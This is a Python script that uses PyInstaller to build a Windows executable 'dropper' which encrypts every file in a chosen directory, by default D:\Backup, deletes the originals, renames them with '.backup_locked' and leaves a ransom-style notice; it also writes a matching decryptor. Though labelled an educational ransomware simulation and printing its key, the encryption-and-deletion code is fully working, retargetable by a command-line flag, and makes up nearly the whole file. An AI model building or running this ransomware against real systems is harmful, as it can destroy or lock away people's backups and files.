#!/usr/bin/env python3
"""
PROPER EXE BUILDER FOR BACKUP ENCRYPTION
Creates EXE droppers without stdin errors
"""

import os
import sys
import subprocess
import tempfile
from pathlib import Path
from cryptography.fernet import Fernet

def create_exe_dropper_no_stdin_errors(target_directory="D:\\Backup", output_directory=None):
    """
    Create EXE dropper that handles stdin properly
    """
    
    if output_directory is None:
        output_directory = Path.cwd()
    else:
        output_directory = Path(output_directory)
    
    output_directory.mkdir(exist_ok=True)
    
    # Generate encryption key
    key = Fernet.generate_key()
    key_repr = repr(key)
    
    print("=" * 60)
    print("CREATING STDIN-SAFE EXE DROPPER")
    print("=" * 60)
    print(f"Target Directory: {target_directory}")
    print(f"Output Directory: {output_directory}")
    print(f"Encryption Key: {key.decode()}")
    print("=" * 60)
    
    # Create the EXE-friendly Python script
    script_content = f'''#!/usr/bin/env python3
"""
BACKUP FOLDER ENCRYPTOR - STDIN-SAFE VERSION
Educational ransomware simulation dropper
"""

import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet
import time

def main():
    # Pre-generated encryption key
    key = {key_repr}
    cipher = Fernet(key)
    target_dir = Path(r"{target_directory}")
    extension = ".backup_locked"
    
    # Handle console output properly
    try:
        print("=" * 60)
        print("BACKUP FOLDER ENCRYPTION DROPPER")
        print("=" * 60)
        print(f"Target Directory: {{target_dir}}")
        print("=" * 60)
        
        # Display key for educational purposes
        print(f"[KEY] {{base64.b64encode(key).decode()}}")
        print("")
        
        if not target_dir.exists():
            target_dir.mkdir(parents=True)
            print("[INFO] Created target directory")
            
            # Create demo files
            demo_files = {{
                "important_backup.txt": "This is important backup data",
                "family_photos.zip": "Family photos archive",
                "work_documents.rar": "Work documents",
                "financial_records.xlsx": "Financial records"
            }}
            
            for filename, content in demo_files.items():
                file_path = target_dir / filename
                with open(file_path, 'w') as f:
                    f.write(content)
            print("[INFO] Created demo files for testing")
        
        print(f"[TARGET] Encrypting files in {{target_dir}}")
        time.sleep(1)
        
        encrypted_count = 0
        for file_path in target_dir.rglob("*"):
            if file_path.is_file() and not file_path.name.endswith(extension):
                try:
                    print(f"[ENCRYPTING] {{file_path.name}}")
                    
                    with open(file_path, 'rb') as f:
                        data = f.read()
                        
                    encrypted_data = cipher.encrypt(data)
                    new_path = str(file_path) + extension
                    
                    with open(new_path, 'wb') as f:
                        f.write(encrypted_data)
                        
                    file_path.unlink()
                    encrypted_count += 1
                    print(f"  -> Successfully encrypted")
                    
                except Exception as e:
                    print(f"  -> Failed to encrypt: {{e}}")
        
        # Create ransom note
        note_content = f"""================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted by educational ransomware.

Target Directory: {{target_dir}}
Files Encrypted: {{encrypted_count}}
Extension Added: {{extension}}

This is an educational simulation designed to demonstrate:
- How ransomware targets backup directories
- The importance of offline backups
- Why backup security is crucial

Educational Purpose Only
================================
"""
        
        note_path = target_dir / "BACKUP_ENCRYPTION_NOTICE.txt"
        with open(note_path, 'w') as f:
            f.write(note_content)
        
        print(f"[NOTE] Created educational notice: {{note_path.name}}")
        print(f"[COMPLETE] Encrypted {{encrypted_count}} files")
        print("=" * 60)
        print("BACKUP FOLDER ENCRYPTION COMPLETE")
        print("=" * 60)
        
        # Handle exit gracefully
        try:
            input("\\nPress Enter to exit...")
        except (EOFError, OSError):
            # This handles the case when running as EXE without stdin
            print("\\nExecution completed.")
            import time
            time.sleep(2)
            
    except Exception as e:
        print(f"[ERROR] {{e}}")
        import time
        time.sleep(3)

if __name__ == "__main__":
    main()
'''
    
    # Create temporary directory for build process
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        # Write the script
        script_file = temp_path / "encryptor_safe.py"
        with open(script_file, 'w') as f:
            f.write(script_content)
        
        print("[BUILD] Creating stdin-safe executable...")
        
        # PyInstaller command with console window (to allow input)
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",           # Single file executable
            "--console",           # Include console window for input/output
            "--name", "BackupFolderEncryptor_Safe",
            "--distpath", str(output_directory),
            "--workpath", str(temp_path / "build"),
            "--specpath", str(temp_path),
            str(script_file)
        ]
        
        try:
            # Run PyInstaller
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                exe_path = output_directory / "BackupFolderEncryptor_Safe.exe"
                if exe_path.exists():
                    size = exe_path.stat().st_size
                    print(f"[SUCCESS] EXE created: {exe_path}")
                    print(f"[INFO] File size: {size:,} bytes")
                    
                    # Create decryptor for the target directory
                    create_safe_decryptor(target_directory, output_directory.parent / "D_Backup")
                    
                    return exe_path, key.decode()
                else:
                    print("[ERROR] EXE file not found after build")
                    return None, None
            else:
                print(f"[ERROR] PyInstaller failed:")
                print(f"STDOUT: {{result.stdout}}")
                print(f"STDERR: {{result.stderr}}")
                return None, None
                
        except subprocess.TimeoutExpired:
            print("[ERROR] Build process timed out")
            return None, None
        except Exception as e:
            print(f"[ERROR] Build failed: {{e}}")
            return None, None

def create_safe_decryptor(target_directory, output_directory):
    """Create decryptor script that handles stdin properly"""
    decryptor_content = f'''#!/usr/bin/env python3
"""
BACKUP FOLDER DECRYPTOR - STDIN-SAFE VERSION
Educational decryption tool
"""

import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet
import time

def main():
    target_dir = Path(r"{target_directory}")
    extension = ".backup_locked"
    
    try:
        print("Enter the encryption key (base64 format):")
        key_input = input().strip()
    except (EOFError, OSError):
        print("[ERROR] Cannot read input. Run from command line or terminal.")
        time.sleep(3)
        return
    
    try:
        key = base64.b64decode(key_input)
        cipher = Fernet(key)
    except Exception as e:
        print(f"[ERROR] Invalid key: {{e}}")
        time.sleep(3)
        return
    
    if not target_dir.exists():
        print(f"[ERROR] Target directory not found: {{target_dir}}")
        time.sleep(3)
        return
    
    print(f"[TARGET] Decrypting files in {{target_dir}}")
    
    decrypted_count = 0
    for file_path in target_dir.rglob(f"*{{extension}}"):
        if file_path.is_file():
            try:
                print(f"[DECRYPTING] {{file_path.name}}")
                
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()
                
                decrypted_data = cipher.decrypt(encrypted_data)
                original_name = str(file_path)[:-len(extension)]
                
                with open(original_name, 'wb') as f:
                    f.write(decrypted_data)
                
                file_path.unlink()
                decrypted_count += 1
                print(f"  -> Successfully decrypted")
                
            except Exception as e:
                print(f"  -> Failed to decrypt: {{e}}")
    
    # Remove ransom note
    note_path = target_dir / "BACKUP_ENCRYPTION_NOTICE.txt"
    if note_path.exists():
        note_path.unlink()
        print("[NOTE] Removed encryption notice")
    
    print(f"[COMPLETE] Decrypted {{decrypted_count}} files")
    input("\\nPress Enter to exit...")

if __name__ == "__main__":
    main()
'''
    
    # Create target directory and place decryptor there
    target_path = Path(target_directory)
    target_path.mkdir(parents=True, exist_ok=True)
    
    decryptor_path = target_path / "backup_decryptor_safe.py"
    with open(decryptor_path, 'w') as f:
        f.write(decryptor_content)
    
    print(f"[DECRYPTOR] Created safe decryptor: {{decryptor_path}}")

def main():
    """Main function for command line usage"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Create stdin-safe backup folder encryption EXE dropper")
    parser.add_argument("--target", default="D:\\\\Backup", help="Target directory to encrypt")
    parser.add_argument("--output", help="Output directory for EXE file")
    
    args = parser.parse_args()
    
    exe_path, key = create_exe_dropper_no_stdin_errors(args.target, args.output)
    
    if exe_path:
        print("\\n" + "=" * 60)
        print("STDIN-SAFE EXE DROPPER CREATION COMPLETE!")
        print("=" * 60)
        print(f"✅ EXE File: {{exe_path}}")
        print(f"🔑 Encryption Key: {{key}}")
        print(f"📁 Target Directory: {{args.target}}")
        print(f"🔓 Safe decryptor placed in: {{args.target}}")
        print("=" * 60)
    else:
        print("\\n❌ Failed to create stdin-safe EXE dropper")

if __name__ == "__main__":
    main()